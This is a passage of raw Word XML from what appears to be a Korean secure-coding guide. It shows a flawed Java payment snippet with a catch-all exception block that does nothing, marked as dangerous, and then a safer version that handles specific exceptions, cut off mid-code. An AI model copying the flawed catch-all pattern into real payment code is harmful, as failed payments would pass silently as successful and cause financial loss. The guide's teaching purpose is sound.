                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    processPayment();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>} catch (Exception e) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>아무</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실패가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>성공으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리될</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있음</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>catch(Exception e)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>묵살하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실패</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조용히</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무시되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결제가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>성공한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>것으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계속</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>진행합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실제로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>금액이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>차감되지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않았는데</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서비스가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제공되는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>금전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>손실이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생하며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>오류</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>원인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>추적도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>불가능해집니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>구체적인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>유형별</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>try {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    processPayment();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>} catch (InsufficientBalanceException e) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    log.warn("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>잔액</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>부족</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>", e);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw new PaymentException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>잔액이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>부족합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>.");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>} catch (NetworkException e) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    log.error("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>결제망</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>연결</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>오류</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>", e);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
